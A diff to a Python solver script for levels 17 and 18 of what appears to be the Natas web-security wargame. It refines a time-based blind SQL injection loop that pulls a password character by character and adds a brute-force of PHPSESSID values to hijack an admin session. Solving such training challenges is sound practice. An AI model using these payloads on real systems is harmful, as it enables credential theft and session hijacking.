@@ -396,7 +396,6 @@ try:
 
 except requests.exceptions.RequestException as e:
   print(f"HTTP Request failed: {e}")
-
 # Level 17
 try:
   chars = string.ascii_letters + string.digits
@@ -404,8 +403,8 @@ try:
   print("\nLevel 17")
   print("Sending Time-Based Blind SQL Payload")
   while len(password) != 32:
-    for char in chars:
-      found_char = False
+    found_char = False
+    for attempt in range(3):
       for char in chars:
         candidate = password + char
         payload = f'" UNION SELECT 1,sleep(5) FROM users where username = "natas18" and password LIKE BINARY "{candidate}%"; -- -'
@@ -417,13 +416,39 @@ try:
           print(f"Found char: {char} | Password so far: {password}")
           found_char = True
           break
-      if not found_char:
-        print("No matching character found.")
+      if found_char:
         break
-  cred_dict["natas17"] = ("natas17",password)
-  
+      print(f"No matching character found. Retry {attempt +1}/3")
+    if not found_char:
+      print("Unable to find next character after 3 attempts. Giving up.")
+      break
+  if len(password) == 32:
+    cred_dict["natas18"] = ("natas18",password)
+
+except requests.exceptions.RequestException as e:
+  print(f"HTTP Request failed: {e}")
+
+# Level 18
+
+try:  
+  print("\nLevel 18")
+  print("Starting Admin-session Cookie Brute-Force...")
+  for session_id in range(1, 641):
+    cookies = {"PHPSESSID": str(session_id)}
+    response = requests.get(url_dict["natas18"]+"/index.php", auth=cred_dict["natas18"], cookies=cookies)
+
+    if "You are an admin" in response.text:
+      print(f"Admin session found! PHPSESSID={session_id}")
+      # Parse the response
+      soup = BeautifulSoup(response.text, "html.parser")
+      text_only = soup.get_text(separator=" ", strip=True)
+      print(text_only)
+      cred_dict["natas19"] = ("natas19",text_only.split()[-3])
+      break
+
 except requests.exceptions.RequestException as e:
   print(f"HTTP Request failed: {e}")
 
 
 print(cred_dict)
+
